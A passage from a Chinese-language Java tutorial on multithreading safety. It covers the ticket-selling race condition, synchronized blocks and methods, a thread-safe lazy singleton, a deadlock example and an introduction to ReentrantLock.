class_">ThreadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Window</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line"></span><br><span class="line">        t1.setName(<span class="string">&quot;窗口1&quot;</span>);</span><br><span class="line">        t2.setName(<span class="string">&quot;窗口2&quot;</span>);</span><br><span class="line">        t3.setName(<span class="string">&quot;窗口3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果出现异常（例如）：</p><p>窗口1:卖票，票号为：100<br>窗口2:卖票，票号为：100<br>窗口3:卖票，票号为：100</p><p>窗口1:卖票，票号为：-1</p><hr><p><strong>1.多线程出现了安全问题</strong></p><p><strong>2. 问题的原因：</strong></p><p>当多条语句在操作<strong>共享数据</strong>时，一个线程对多条语句只执行了一部分，还没有执行完，另一个线程参与进来执行，导致共享数据的错误。</p><p><strong>3. 解决办法：</strong></p><p>当一个线程a在操作共享数据的时候，其他线程不能参与进来。直到线程a操作完共享数据后，其他线程才可以开始操作共享数据。这种情况即使线程a出现了阻塞，也不能被改变。</p><h2 id="Synchronized的使用方法"><a href="#Synchronized的使用方法" class="headerlink" title="Synchronized的使用方法"></a>Synchronized的使用方法</h2><p> Java对于多线程的安全问题提供了专业的解决方式：<strong>同步机制</strong></p><hr><p><strong>1. 同步代码块：</strong></p><p>synchronized (同步监视器){</p><p>&#x2F;&#x2F; 需要被同步的代码；</p><p>}</p><blockquote><p>说明：</p><ul><li>操作共享数据的代码，即为需要被同步的代码。  –&gt;不能包含代码多了，也不能包含代码少了。</li></ul><ul><li><pre><code>  共享数据：多个线程共同操作的变量。比如：ticket就是共享数据。</code></pre></li><li><pre><code>  同步监视器，俗称：锁。**任何一个类的对象，都可以充当锁。**</code></pre></li><li><pre><code>  要求：多个线程必须要**共用同一把锁**。</code></pre></li><li><pre><code>  在实现Runnable接口创建多线程的方式中，我们可以考虑使用this充当同步监视器。</code></pre></li><li><pre><code>  在继承Thread类创建多线程的方式中，慎用this充当同步监视器，考虑使用当前类充当同步监视器。</code></pre></li></ul></blockquote><hr><p>2.synchronized还可以放在方法声明中，表示整个方法为<strong>同步方法</strong>。</p><p>public synchronized void show (String name){</p><p>&#x2F;&#x2F; 需要被同步的代码；</p><p>}</p><blockquote><p>关于同步方法的总结：</p><ul><li>同步方法仍然涉及到同步监视器，只是不需要我们显式的声明。</li><li><strong>非静态的同步方法，同步监视器是：this</strong></li><li><pre><code>**静态的同步方法，同步监视器是：当前类本身**</code></pre></li></ul></blockquote><hr><h3 id="使用同步代码块且实现Runnable"><a href="#使用同步代码块且实现Runnable" class="headerlink" title="使用同步代码块且实现Runnable"></a>使用同步代码块且实现Runnable</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Window1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>)&#123;<span class="comment">//this（唯一的Window1的对象）或obj</span></span><br><span class="line">                <span class="keyword">if</span> (ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:卖票，票号为：&quot;</span> + ticket);</span><br><span class="line">                    ticket--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Window1</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window1</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line"></span><br><span class="line">        t1.setName(<span class="string">&quot;窗口1&quot;</span>);</span><br><span class="line">        t2.setName(<span class="string">&quot;窗口2&quot;</span>);</span><br><span class="line">        t3.setName(<span class="string">&quot;窗口3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用同步代码块且继承Thread"><a href="#使用同步代码块且继承Thread" class="headerlink" title="使用同步代码块且继承Thread"></a>使用同步代码块且继承Thread</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Window2</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();<span class="comment">//注意：这里是静态的，多个对象共享静态数据</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Window2.class)&#123;<span class="comment">//obj或Window2.class，不能使用this</span></span><br><span class="line">                <span class="comment">//（this代表着t1,t2,t3三个对象，没有使用到同一把锁）</span></span><br><span class="line">                <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(getName() + <span class="string">&quot;：卖票，票号为：&quot;</span> + ticket);</span><br><span class="line">                    ticket--;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Window2</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window2</span>();</span><br><span class="line">        <span class="type">Window2</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window2</span>();</span><br><span class="line">        <span class="type">Window2</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window2</span>();</span><br><span class="line"></span><br><span class="line">        t1.setName(<span class="string">&quot;窗口1&quot;</span>);</span><br><span class="line">        t2.setName(<span class="string">&quot;窗口2&quot;</span>);</span><br><span class="line">        t3.setName(<span class="string">&quot;窗口3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用同步方法且实现Runnable"><a href="#使用同步方法且实现Runnable" class="headerlink" title="使用同步方法且实现Runnable"></a>使用同步方法且实现Runnable</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Window3</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;<span class="comment">//同步监视器：this</span></span><br><span class="line">        <span class="keyword">if</span> (ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:卖票，票号为：&quot;</span> + ticket);</span><br><span class="line">            ticket--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Window3</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window3</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line"></span><br><span class="line">        t1.setName(<span class="string">&quot;窗口1&quot;</span>);</span><br><span class="line">        t2.setName(<span class="string">&quot;窗口2&quot;</span>);</span><br><span class="line">        t3.setName(<span class="string">&quot;窗口3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用同步方法且继承Thread"><a href="#使用同步方法且继承Thread" class="headerlink" title="使用同步方法且继承Thread"></a>使用同步方法且继承Thread</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Window4</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;<span class="comment">//同步监视器：Window4.class</span></span><br><span class="line">        <span class="comment">//private synchronized void show()&#123; //同步监视器：t1,t2,t3。此种解决方式是错误的</span></span><br><span class="line">        <span class="keyword">if</span> (ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;：卖票，票号为：&quot;</span> + ticket);</span><br><span class="line">            ticket--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadTest4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Window4</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window4</span>();</span><br><span class="line">        <span class="type">Window4</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window4</span>();</span><br><span class="line">        <span class="type">Window4</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window4</span>();</span><br><span class="line"></span><br><span class="line">        t1.setName(<span class="string">&quot;窗口1&quot;</span>);</span><br><span class="line">        t2.setName(<span class="string">&quot;窗口2&quot;</span>);</span><br><span class="line">        t3.setName(<span class="string">&quot;窗口3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="单例设计模式之懒汉式-线程安全"><a href="#单例设计模式之懒汉式-线程安全" class="headerlink" title="单例设计模式之懒汉式(线程安全)"></a>单例设计模式之懒汉式(线程安全)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankTest</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bank</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Bank</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Bank</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Bank <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//方式一：效率稍差,线程一个个调用</span></span><br><span class="line"><span class="comment">//        synchronized (Bank.class) &#123;</span></span><br><span class="line"><span class="comment">//            if(instance == null)&#123;</span></span><br><span class="line"><span class="comment">//                instance = new Bank();</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//            return instance;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//方式二：效率更高</span></span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Bank.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Bank</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程的死锁问题"><a href="#线程的死锁问题" class="headerlink" title="线程的死锁问题"></a>线程的死锁问题</h2><ul><li><p>死锁</p><ul><li>不同的线程分别占用对方需要的同步资源不放弃，都在等待对方放弃自己需要的同步资源，就形成了线程的死锁</li><li>出现死锁后，不会出现异常，不会出现提示，只是所有的线程都处于阻塞状态，无法继续</li></ul></li><li><p>解决方法</p><ul><li>专门的算法、原则</li><li>尽量减少同步资源的定义</li><li>尽量避免嵌套同步</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (s1) &#123;</span><br><span class="line">                    s1.append(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">                    s2.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">synchronized</span> (s2) &#123;</span><br><span class="line">                        s1.append(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">                        s2.append(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">                        System.out.println(s1);</span><br><span class="line">                        System.out.println(s2);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (s2) &#123;</span><br><span class="line">                    s1.append(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">                    s2.append(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">synchronized</span> (s1) &#123;</span><br><span class="line">                        s1.append(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">                        s2.append(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">                        System.out.println(s1);</span><br><span class="line">                        System.out.println(s2);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Lock-锁"><a href="#Lock-锁" class="headerlink" title="Lock(锁)"></a>Lock(锁)</h2><ul><li><p>从JDK 5.0开始，Java提供了更强大的线程同步机制——通过显式定义同步锁对象来实现同步。同步锁使用Lock对象充当。 </p></li><li><p>java.util.concurrent.locks.Lock接口是控制多个线程对共享资源进行访问的工具。锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得Lock对象。 </p></li><li><p>ReentrantLock 类实现了 Lock ，它拥有与 synchronized 相同的并发性和内存语义，在实现线程安全的控制中，比较常用的是ReentrantLock，可以显式加锁、释放锁。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 